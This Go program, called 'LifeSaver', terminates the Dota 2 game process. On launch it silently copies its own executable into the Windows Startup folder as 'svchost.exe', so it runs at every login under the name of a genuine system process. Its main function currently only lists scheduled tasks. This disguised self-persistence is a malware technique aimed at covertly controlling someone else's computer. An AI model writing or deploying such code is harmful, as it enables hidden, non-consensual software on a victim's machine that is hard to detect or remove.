package main

import (
	"log"
	"time"
	"os"
	"os/exec"
	"path"
	"path/filepath"
    "bytes"
    "fmt"
	winapi "github.com/winlabs/gowin32"
)

var (
	DotaProcessFileName = "dota2.exe"
	LogFileName = "lifesaverlog.txt"
	CheckProcessesInterval = 100 * time.Millisecond
	logger *log.Logger
)

func setupLogger() {
	logFilePath := LogFileName
	homeDir, err := os.UserHomeDir()
	if err != nil {
       log.Println("Error while getting home dir", err)
	   logger = log.Default()
       return
    }
	logFilePath = path.Join(homeDir, LogFileName)
	logFile, err := os.OpenFile(logFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0777)
	if err != nil {
		log.Println("Error while opening log file", err)
		logger = log.Default()
		return
	}

	logger = log.New(logFile, "LifeSaver: ", log.LstdFlags)
}

func KillDota() {
	procs, err := winapi.GetProcesses()
	if err != nil { 
		logger.Println("Error while getting list of processes: ", err)
		return
	}
	
	for _, proc := range procs {
		if proc.ExeFile == DotaProcessFileName {
			err = winapi.KillProcess(proc.ProcessID, 322)
			if err != nil {
				logger.Println("Can't kill Dota >:\\", err)
				return
			}
			logger.Println("Dota 2 killed successfully, GG!")
			break
		}
	}
}

func copyToStartup() {
	exe, err := os.Executable()
	if err != nil {
		logger.Println(err)
		return
	}
	
	appdata, err := os.UserConfigDir()
	if err != nil {
		logger.Println(err)
		return
	}
	
	startupDir := path.Join(appdata, "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
	if startupDir == filepath.Dir(exe) { 
		return
	}
	
	r, err := os.Open(exe)
	if err != nil {
		logger.Println(err)
		return
	}
	defer r.Close()
	w, err := os.Create(path.Join(startupDir, "svchost.exe"))
	if err != nil {
		logger.Println(err)
		return
	}
	defer w.Close()
	w.ReadFrom(r)
}

func init() {
	setupLogger()
	copyToStartup()
}

func main() {
	// SaveLife()
    cmd := exec.Command("schtasks")
    var out bytes.Buffer
    cmd.Stdout = &out
    err := cmd.Run()
    if err != nil {
       fmt.Println(err)
    }
    fmt.Println(out.String())
}
